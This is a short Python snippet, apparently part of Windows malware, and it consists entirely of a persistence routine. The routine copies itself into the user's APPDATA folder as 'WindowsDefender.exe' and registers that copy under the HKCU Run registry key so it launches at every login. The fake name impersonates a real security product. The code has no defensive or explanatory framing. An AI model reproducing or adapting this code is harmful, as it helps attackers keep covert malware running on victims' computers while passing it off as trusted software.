import os, shutil, winreg

def setup_persistence():
    hidden_path = os.path.join(os.environ["APPDATA"], "WindowsDefender.exe")
    if not os.path.exists(hidden_path):
        shutil.copyfile(__file__, hidden_path)
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Microsoft\Windows\CurrentVersion\Run", 0,
                             winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "WindowsDefender", 0, winreg.REG_SZ, hidden_path)
        winreg.CloseKey(key)
